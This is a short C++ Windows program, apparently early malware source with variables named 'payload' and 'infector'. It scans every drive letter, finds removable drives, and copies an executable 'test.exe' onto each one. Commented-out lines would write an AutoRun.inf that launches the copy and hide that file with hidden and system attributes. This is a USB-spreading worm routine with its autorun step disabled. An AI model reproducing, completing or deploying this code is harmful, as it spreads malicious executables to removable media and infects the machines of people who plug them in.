#include <windows.h>
#include <fstream>
#include <iostream>


const char *drive[]={ 
    "a:", "b:", "c:", "d:", "e:", "f:", "g:", "h:", "i:", "j:", "k:", "l:",
    "m:", "n:", "o:", "p:", "q:", "r:", "s:", "t:", "u:", "v:", "w:", "x:",
    "y:", "z:", 0
};

const char payload[MAX_PATH]="\\test.exe";
const char infector[MAX_PATH]="\\infector.exe";

int FindDrv(const char *drive)
{
    char dirX[MAX_PATH];
    char path[MAX_PATH];
    char autorun[MAX_PATH]="AutoRun.inf";
    //std::ofstream CreAut;
    
    //gets path of the current files
    HMODULE GetQ; 
    GetQ=GetModuleHandle(NULL);
    GetModuleFileName(GetQ,path,sizeof(path));

    std::string tempString = path;
    std::string buff = tempString.substr(0, tempString.find_last_of("\\"));
    strcpy(path, buff.c_str());
    strcat(path, payload);

    //CreAut.open(dirX,std::ios_base::out);
    //CreAut<<"[AutoRun]" << std::endl;
    //CreAut<<"open=test.exe" << std::endl;
    //CreAut<<"shellexecute=test.exe" << std::endl;
    //CreAut<<"UseAutoPlay=1" << std::endl;
    //CreAut<<"shell\\Auto\\command=test.exe" << std::endl;
    //CreAut<<"shell=Auto" << std::endl;
    //CreAut.close();
    //SetFileAttributes(dirX,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);

    UINT type= GetDriveType(drive);
    
    if(type == DRIVE_REMOVABLE)
    {
        strcpy(dirX, drive);
        strcat(dirX, "\\");
        strcat(dirX, "test.exe");

        //std::cout << "path: " << path << std::endl;
        //std::cout << "dirX: " << dirX << std::endl;

        CopyFile(path,dirX,TRUE); 
        SetFileAttributes(path,FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
        //strcpy(dirX, drive);
        //strcat(dirX, "\\" );
        //strcat(dirX, autorun);
        //std::cout << "dirX: " << dirX << std::endl << std::endl << std::endl;

        return 0;
    } else {
        //std::cout << "Not detected removable" << std::endl;
    }
    return 0;
 
}

int main()
{
    for(int i=0;drive[i];i++)
    {
        FindDrv(drive[i]);
    }
    return 0;
}









